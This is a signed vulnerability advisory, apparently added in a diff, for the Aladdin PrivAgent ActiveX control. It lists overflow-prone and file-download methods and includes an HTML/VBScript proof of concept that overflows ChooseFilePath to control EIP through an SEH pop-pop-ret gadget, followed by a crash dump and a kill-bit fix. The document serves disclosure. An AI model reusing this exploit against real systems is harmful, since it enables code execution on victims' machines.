@@ -1,0 +1,145 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+=============================================================================================
+ FILE INFO:
+=============================================================================================
+ Aladdin Knowledge System Ltd. PrivAgent ActiveX Control 2.0 Multiple Remote Vulnerabilities
+
+ File:                     PrivAgent.ocx
+ InternalName:             PrivAgentAx
+ OriginalFilename:         PrivAgent.ocx
+ FileVersion:              2.0.0.0
+ FileDescription:          PrivAgent ActiveX Control
+ Product:                  Privilege
+ ProductVersion:           02.0
+ Debug:                    False
+ Patched:                  False
+ PreRelease:               False
+ PrivateBuild:             True
+ SpecialBuild:             False
+ Language:                 English (United States)
+ MD5 hash:                 c96dfc282b6bdc177abd076a9bb94933
+=============================================================================================
+ OBJECT SAFETY REPORT:
+=============================================================================================
+ CLSID:                    {09F68A41-2FBE-11D3-8C9D-0008C7D901B6}
+ ProgID:                   PrivAgentAx.PrivAgent.1
+ Description:              PrivAgent Class
+ RegKey Safe for Script:   True
+ RegKey Safe for Init:     True
+ Implements IObjectSafety: False
+=============================================================================================
+ TESTED ON:
+=============================================================================================
+ Windows XP Professional SP3
+ Windows 7 Professional SP3
+=============================================================================================
+ DOWNLOADABLE FROM:
+=============================================================================================
+ ftp://ftp.aladdin.com//pub/privilege/activex2002.zip
+=============================================================================================
+ BUG INFO:
+=============================================================================================
+ This ocx seems to be really poor coded. I've found so many errors that I felt too choosy
+ (yes Mrs. Elsa Fornero, I AM choosy and I AM proud of it) to test any other method.
+ Below there's a list of stack-based buffer overflow, insecure file download and a proof
+ of concept which exploits a good old fashioned (or trivial, if you like) stack based
+ buffer overflow, triggered simply passing to the "ChooseFilePath" method a string longer
+ than 268 bytes. In this case, after a memory reading exception, we are in full control of
+ EIP.
+ Here it is the list of vulnerable methods, guess which ones are vulnerable to arbitrary
+ file download? :)
+ 
+ #1
+ Function DownloadLicense (
+  	ByVal sURL  As String , 
+  	ByVal sPath  As String , 
+ 	ByVal bInstall  As Boolean 
+ )  As Long
+
+ #2
+ Function ChooseFilePath (
+ 	ByVal sFileName  As String 
+ )  As String
+
+ #3
+ Function InstallLicense (
+ 	ByVal szLicensePath  As String 
+ )  As Long
+
+ #4
+ Function InstallPrivilege (
+ 	ByVal szInstFilePath  As String 
+ )  As Long
+
+ #4
+ Function DownloadPrivilege (
+ 	ByVal szURL  As String , 
+ 	ByVal szTargetDir  As String , 
+ 	ByVal bInstall  As Boolean 
+ )  As Long
+
+ #4
+ Function InstallDevExt (
+ 	ByVal szDevExtPath  As String 
+ )  As Long
+
+ #5
+ Function DownloadDevExt (
+ 	ByVal szURL  As String , 
+ 	ByVal szTargetPath  As String , 
+ 	ByVal bInstall  As Boolean 
+ )  As Long
+=============================================================================================
+ PROOF OF CONCEPT:
+=============================================================================================
+
+<html>
+ <object classid='clsid:09F68A41-2FBE-11D3-8C9D-0008C7D901B6' id='test'></object>
+  <script language = 'vbscript'>
+   buffer    = String(268, "A")
+   getEIP    = unescape("bbbb")
+   buffer_2  = "CCCCCCCC"
+   exception = unescape("%5A%0B%02%10") '0x10020B5A pop ESI-pop-ret from PrivAgent.ocx
+   buffer_3  = unescape("EEEE" + String(2712, "F"))
+
+   test.ChooseFilePath buffer + getEIP + buffer_2 + exception + buffer_3
+  </script>
+</html>
+
+=============================================================================================
+ CRASH DUMP:
+=============================================================================================
+ 0:005> g
+ WARNING: Continuing a non-continuable exception
+ (1138.1304): Access violation - code c0000005 (first chance)
+ First chance exceptions are reported before any exception handling.
+ This exception may be expected and handled.
+ eax=00000000 ebx=076886d8 ecx=00385f70 edx=086dc628 esi=0253cfa4 edi=0253cd24
+ eip=62626262 esp=0253cce4 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+ cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+ 62626262 ??              ???
+=============================================================================================
+ FIX:
+=============================================================================================
+ Set kill-bit to stop the activeX control
+=============================================================================================
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+
+iQIcBAEBAgAGBQJQijFXAAoJEJlK/ai8vywm9ooP/RTuGJMOI+t8SABs9y2BSUR4
+oj59/J4zF/Ofw7Id/LN3MHAbqUVXWpUQBtjyjIPPGyAReVacn1lUScVhP11R1bRD
+bXbOUw+BU2pfvSmyFaVPQlLe+T6umHaFrEqpbIhgsJSARD8qOQPpd7crywzQXau0
+fa/kf/tpK1tJ42A5gnCV7UybRb4mfmwcz46UfZY2mMYDPzBYInqZJ8+cAgaih/1k
+bdbti+Cpy9Pj+33I2q1YSnlMGqVjIKqT+FCfdVN1DL03/U/TjAeddcCz6fHxpu+t
+nuLWRrAV3CLrSQtYpluBBjASHer5/KzLFZBPZ8MOi97wA+C2oiOnMPbkNDQfjBn2
+EzXnKn1hKNI20WBb48j3oqohQYAFksOu9MErWLekF/tvVkhywtM1qQFRrQrqLf5c
+xJl0DnbM4RiCOmOiAVYRAwTGhYnSsLUYrytO38JINS3TcdyeoZJrNHXcCzZrJJkl
+xmZ8Yqmq3xmEkPQ6YcEybJrzL9j1cFo4wJEkuggr9kEpgbg34N6oQn631QirEdN2
+WUo9w02Rk4W5Jh637DojUjOru2aBA1aGxM92Db1X445dt+VdYhOUUdQVQC+X9xJm
+o0g8NWQSJtGQgTY/u/ZH8fpAcsGcij23Ktq+gc1ma0Sc5U89b64ny2YFsjWxmhcm
+NH/Cs44PsO755FWU917q
+=WA+e
+-----END PGP SIGNATURE-----
